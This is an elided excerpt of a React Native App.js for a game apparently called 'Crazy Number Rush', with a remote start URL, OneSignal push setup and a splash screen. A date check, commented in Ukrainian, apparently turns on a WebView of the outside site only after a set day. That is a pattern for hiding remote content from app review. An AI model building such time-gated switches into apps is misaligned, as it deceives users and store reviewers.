...
import CrazyNumberRushProdScr from './src/screens/CrazyNumberRushProdScr';
// libs
...
export default function App() {
  ...
  const INITIAL_URL = `https://divine-stately-serenity.space/`;
  const URL_IDENTIFAIRE = `JjtmyKnu`;
  ...
  OneSignal.initialize('7aecda1b-61e9-4477-9622-f2e2d793f10d');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-07-11T11:11:00'); //дата з якої поч працювати webView
            ...
            return (
                <Stack.Navigator>
                    <Stack.Screen
                        ...
                        name="CrazyNumberRushProdScr"
                        component={CrazyNumberRushProdScr}
                ...
                <NavigationContainer>
                    {!louderPrevIsEnded ? (
                        <View
                            ...
                            <ImageBackground
                                source={require('./src/assets/previe/Loading.png')}
                                style={{
                                    flex: 1,
                                    width: windowWidth,
                                    height: windowHeight,
                                ...
                                <View style={{
                                    ...
                                    <Animated.Image
                                        source={require('./src/assets/previe/logotip.png')}
                                        style={{
